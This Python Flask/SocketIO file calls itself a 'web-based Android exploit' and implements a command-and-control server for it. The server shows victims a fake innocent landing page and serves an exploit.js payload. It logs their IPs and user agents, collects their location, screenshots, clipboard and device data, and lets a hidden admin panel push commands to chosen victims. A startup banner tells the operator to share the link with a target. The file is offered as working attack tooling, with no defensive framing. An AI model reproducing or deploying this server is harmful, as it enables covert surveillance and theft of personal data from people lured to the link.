"""
ğŸŒ WEB-BASED ANDROID EXPLOIT
Victim opens link â†’ Instant phone access!
No app installation needed!
"""

from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room
import os
import json
from datetime import datetime
import base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key_change_this'
socketio = SocketIO(app, cors_allowed_origins="*")

# Store connected sessions
connected_sessions = {}
captured_data = {
    'screenshots': [],
    'locations': [],
    'device_info': [],
    'clipboard': [],
    'files': []
}

@app.route('/')
def index():
    """Fake landing page (looks innocent)"""
    return render_template('landing.html')

@app.route('/test')
def test_page():
    """Test page for debugging commands"""
    return render_template('test.html')

@app.route('/vibrate-test')
def vibrate_test():
    """Dedicated vibration diagnostic page"""
    return render_template('vibrate_test.html')

@app.route('/admin')
def admin_panel():
    """Your control panel (secret admin page)"""
    return render_template('admin.html')

@app.route('/exploit.js')
def exploit_script():
    """JavaScript payload that runs on victim's browser"""
    return render_template('exploit.js'), 200, {'Content-Type': 'application/javascript'}

@socketio.on('connect')
def handle_connect():
    """New victim connected"""
    session_id = request.sid
    
    # Join room for targeted messaging
    join_room(session_id)
    
    # Get victim info
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    connected_sessions[session_id] = {
        'ip': ip,
        'user_agent': user_agent,
        'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'active': True
    }
    
    print(f"[+] New connection from: {ip}")
    print(f"    User Agent: {user_agent}")
    print(f"    Session: {session_id}")
    print(f"    Joined room: {session_id}")
    
    # Notify admin panel
    emit('victim_connected', {
        'session_id': session_id,
        'ip': ip,
        'user_agent': user_agent,
        'time': connected_sessions[session_id]['connected_at']
    }, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    """Victim disconnected"""
    session_id = request.sid
    leave_room(session_id)
    if session_id in connected_sessions:
        connected_sessions[session_id]['active'] = False
        print(f"[-] Disconnected: {connected_sessions[session_id]['ip']}")

@socketio.on('victim_data')
def handle_victim_data(data):
    """Receive data from victim"""
    session_id = request.sid
    data_type = data.get('type')
    
    print(f"[*] Received {data_type} from {session_id}")
    
    # Store data
    if data_type == 'device_info':
        captured_data['device_info'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
    
    elif data_type == 'location':
        captured_data['locations'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
    
    elif data_type == 'screenshot':
        captured_data['screenshots'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
    
    elif data_type == 'clipboard':
        captured_data['clipboard'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
    
    # Send to admin panel
    emit('data_received', {
        'session': session_id,
        'type': data_type,
        'data': data.get('data'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }, broadcast=True)

@socketio.on('admin_command')
def handle_admin_command(data):
    """Send command to victim from admin panel"""
    target_session = data.get('session')
    command = data.get('command')
    params = data.get('params', {})
    
    print(f"[>] Sending command '{command}' to {target_session}")
    print(f"    Parameters: {params}")
    
    # Send command to specific victim's room
    emit('execute_command', {
        'command': command,
        'params': params
    }, room=target_session)
    
    print(f"[âœ“] Command sent to room {target_session}")

@app.route('/api/sessions')
def get_sessions():
    """Get list of connected sessions"""
    return jsonify({
        'sessions': [
            {
                'id': sid,
                'ip': info['ip'],
                'user_agent': info['user_agent'],
                'connected_at': info['connected_at'],
                'active': info['active']
            }
            for sid, info in connected_sessions.items()
        ]
    })

@app.route('/api/captured_data')
def get_captured_data():
    """Get all captured data"""
    return jsonify(captured_data)

@app.route('/api/clear_data', methods=['POST'])
def clear_data():
    """Clear captured data"""
    global captured_data
    captured_data = {
        'screenshots': [],
        'locations': [],
        'device_info': [],
        'clipboard': [],
        'files': []
    }
    return jsonify({'success': True})

if __name__ == '__main__':
    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           ğŸŒ WEB-BASED ANDROID EXPLOIT SERVER ğŸŒ          â•‘
â•‘              Instant Access via Link Click                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[*] Starting server...
[*] Victim link: http://localhost:5000
[*] Admin panel: http://localhost:5000/admin
[*] 
[*] Share the victim link with target!
[*] When they open it, you get instant access!
    """)
    
    # Create templates directory if not exists
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
